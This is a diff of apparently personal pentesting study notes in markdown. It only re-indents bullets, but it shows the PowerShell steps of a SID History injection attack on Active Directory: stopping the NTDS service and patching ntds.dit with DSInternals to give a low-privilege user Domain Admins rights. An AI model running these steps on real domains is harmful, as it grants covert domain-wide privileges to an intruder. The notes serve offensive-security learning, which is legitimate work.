@@ -81,15 +81,15 @@ for example:
       - Since the SIDs are added to the user's token, privileges would be respected even if the account is not a member of the actual group
       - but our account can simply be a normal user account with membership only to the Domain Users group.
   ### operations:
-      -  let's make sure that our low-privilege user does not currently have any information in their SID history
+  -  let's make sure that our low-privilege user does not currently have any information in their SID history
       ```ps1
         Get-ADUser <your ad username> -properties sidhistory,memberof
       ```
-      - Let's get the SID of the Domain Admins group since this is the group we want to add to our SID History:
+  - Let's get the SID of the Domain Admins group since this is the group we want to add to our SID History:
       ```ps1
         Get-ADGroup "Domain Admins"
       ```      
-      - we will use the ![DSInternals](https://github.com/MichaelGrafnetter/DSInternals) tools to directly patch the ntds.dit file
+  - we will use the ![DSInternals](https://github.com/MichaelGrafnetter/DSInternals) tools to directly patch the ntds.dit file
       ```ps1
         Stop-Service -Name ntds -force
         Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit
